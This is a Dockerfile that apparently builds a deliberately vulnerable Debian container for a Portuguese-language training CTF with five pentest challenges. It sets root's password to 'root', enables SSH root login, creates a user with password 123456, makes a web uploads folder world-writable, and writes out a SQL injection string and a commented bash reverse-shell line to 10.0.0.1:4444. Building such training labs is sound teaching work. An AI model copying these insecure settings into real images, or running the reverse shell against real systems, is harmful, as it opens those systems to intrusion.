FROM debian:12-slim

LABEL maintainer="CTF SENAI" description="Cenário Pentest - 5 Desafios"

# Instalar apenas ferramentas essenciais
RUN apt-get update && apt-get install -y --no-install-recommends \
    openssh-server python3 netcat-openbsd nmap file apache2 sudo \
    && apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# SSH + usuário vulnerável
RUN mkdir -p /var/run/sshd && echo 'root:root' | chpasswd \
    && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config \
    && useradd -m -s /bin/bash ctfuser && echo 'ctfuser:123456' | chpasswd

# Criar todos os desafios
RUN mkdir -p /root/pentest /var/www/html/uploads \
    && echo "W34K_P4SSW0RD" > /home/ctfuser/flag.txt && chown ctfuser:ctfuser /home/ctfuser/flag.txt && chmod 600 /home/ctfuser/flag.txt \
    && echo "P0RT_SC4NN3R" > /root/pentest/scan_flag.txt \
    && chmod 777 /var/www/html/uploads && echo "UPL04D_VULN" > /var/www/html/uploads/flag.txt \
    && echo "' OR '1'='1" > /root/pentest/sqli_payload.txt && echo "SQL1_M4ST3R" > /root/pentest/sqli_flag.txt \
    && echo -e '#!/bin/bash\n# Reverse Shell Example\n# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n# Flag: R3V3RS3_SH3LL' > /root/pentest/revshell.sh \
    && chmod +x /root/pentest/revshell.sh && echo "R3V3RS3_SH3LL" > /root/pentest/revshell_flag.txt

# Script de inicialização
RUN echo -e '#!/bin/bash\nservice apache2 start\n/usr/sbin/sshd -D' > /start.sh && chmod +x /start.sh

EXPOSE 22 80
CMD ["/start.sh"]
